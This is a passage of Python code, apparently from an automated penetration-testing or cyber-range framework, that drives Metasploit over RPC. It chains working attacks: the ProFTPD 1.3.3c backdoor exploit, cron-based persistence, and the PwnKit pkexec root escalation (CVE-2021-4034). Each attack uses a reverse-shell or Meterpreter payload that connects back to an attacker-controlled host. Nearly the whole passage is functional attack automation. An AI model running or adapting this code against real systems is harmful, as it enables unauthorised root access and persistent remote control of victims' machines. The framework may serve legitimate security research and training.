        # Return None if shell was not created
        if shell_id is None:
            end = time.time()
            print("* WARNING: Exploit shell is not exited.")
            return None, None, end-start

        if process == storyboard.TOMCAT:
            session_id, exec_time, job_id = self.do_pe_pkexec(msfrpc, host_ip_list, shell_id)
        elif process == storyboard.PROFTPD:
            session_id, exec_time = self.do_pe_proftpd(msfrpc, host_ip_list)
        elif process == storyboard.CRON:
            session_id, exec_time = self.do_pe_cron(msfrpc, host_ip_list, shell_id)
        else:
            logging.debug(f"Privilege Escalation action is not existed")
            end = time.time()
            exec_time = end-start

        # Get the access level
        if session_id:
            shell = msfrpc.sessions.session(session_id)
            access = self.get_access_level(shell)
            if (isinstance(shell, MeterpreterSession)):
                shell.stop()
                msfrpc.jobs.stop(job_id)
            return shell, access, exec_time
        else:
            print(f"Shell for host {self.address} could not be created")
            return None, None, exec_time

    def do_pe_proftpd(self, msfrpc, host_ip_list):
        """Do proftpd-based privilege escalation on hosts in list

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host_ip_list (list): list of host that is used for do pe

        Returns
        -------
        shell_id (int): id of shell session of current host
        """

        shell_id = None
        start = time.time()

        for host in host_ip_list:
            pe_proftpd = msfrpc.modules.use('exploit', 'unix/ftp/proftpd_133c_backdoor')
            pe_proftpd[storyboard.RHOSTS] = host
            pe_proftpd[storyboard.RPORT] = 2121

            payload = msfrpc.modules.use('payload', 'cmd/unix/reverse')
            payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_IP]
            payload[storyboard.LPORT] = 4444

            result = pe_proftpd.execute(payload=payload)
            # Get the job id on success
            job_id = self.parse_exploit_result(result)

            if not job_id:
                end = time.time()
                print("None in not job_id")
                return None, end-start
            else:
                flag = True # Stop when shell is created or job is finished
                while flag:

                    if (job_id not in msfrpc.jobs.list):
                        print("* WARNING: Job does not exist")
                        print(msfrpc.sessions.list)
                        flag = False

                    # Get shell id from msfrpc sesions list
                    shell_id = self.get_current_shell_id(msfrpc, host_ip_list, storyboard.PROFTPD, arch=storyboard.CMD)
                    if shell_id:
                        flag = False
                        break

                    end = time.time()

            end = time.time()

            msfrpc.jobs.stop(job_id)

            if shell_id:
                break

        return shell_id, end-start

    def do_pe_cron(self, msfrpc, host_ip_list, shell_id):
        """Do cron-based privilege escalation on hosts in list

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host_ip_list (list): list of host that is used for do pe
        shell_id (int): id of the shell of current host

        Returns
        -------
        shell_id (int): id of shell session of current host
        """
        start = time.time()

        exploit_cron = msfrpc.modules.use('exploit', 'linux/local/cron_persistence')
        exploit_cron[storyboard.SESSION] = int(shell_id)
        exploit_cron[storyboard.VERBOSE] = False
        exploit_cron[storyboard.CLEANUP] = False
        exploit_cron[storyboard.WFSDElAY] = 65

        payload = msfrpc.modules.use('payload', 'cmd/unix/reverse_python')
        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_IP]

        result = exploit_cron.execute(payload=payload)
        job_id = self.parse_exploit_result(result)

        if not job_id:
            end = time.time()
            print("* WARNING: Shell job could not be created")
            return None, end-start
        else:
            flag = True # Stop when meterpreter is created or job is finished
            while flag:

                if (job_id not in msfrpc.jobs.list):
                    print("* WARNING: Job does not exist")
                    print(msfrpc.sessions.list)
                    flag = False

                shell_id = self.get_current_shell_id(msfrpc, host_ip_list, storyboard.CRON, arch=storyboard.CMD)

                end = time.time()

        end = time.time()
        msfrpc.jobs.stop(job_id)

        return shell_id, end-start

    def do_pe_pkexec(self, msfrpc, host_ip_list, shell_id):
        """Do pkexec-based privilege escalation on hosts in list

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host_ip_list (list): list of host that is used for do pe
        shell_id (int): id of the shell of current host

        Returns
        -------
        meterpreter_id (int): id of meterpreter session of current host
        """
        start = time.time()

        meterpreter_id = None

        # Gain root access
        exploit_pkexec = msfrpc.modules.use('exploit','linux/local/cve_2021_4034_pwnkit_lpe_pkexec')
        exploit_pkexec[storyboard.SESSION] = int(shell_id)
        exploit_pkexec[storyboard.AUTO_CHECK] = False
        exploit_pkexec[storyboard.FORCE_EXPLOIT] = True

        payload = msfrpc.modules.use('payload', 'linux/x64/meterpreter/reverse_tcp')
        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_IP]
        payload[storyboard.LPORT] = 4444

        result = exploit_pkexec.execute(payload=payload)
        job_id = self.parse_exploit_result(result)

        if not job_id:
            end = time.time()
            print("* WARNING: Meterpreter job could not be created")
            return None, end-start
        else:
            flag = True # Stop when meterpreter is created or job is finished
            while flag:

                if (job_id not in msfrpc.jobs.list):
                    print("* WARNING: Meterpreter job does not exist")
                    print(msfrpc.sessions.list)
                    flag = False

                # Get meterpreterr id from msfrpc sesions list
                for host in host_ip_list:
                    meterpreter_id = self.get_existed_meterpreter_id(msfrpc, host, storyboard.PKEXEC)
                    if meterpreter_id:
                        flag = False
                        break

                end = time.time()

            end = time.time()

        return meterpreter_id, end-start, job_id

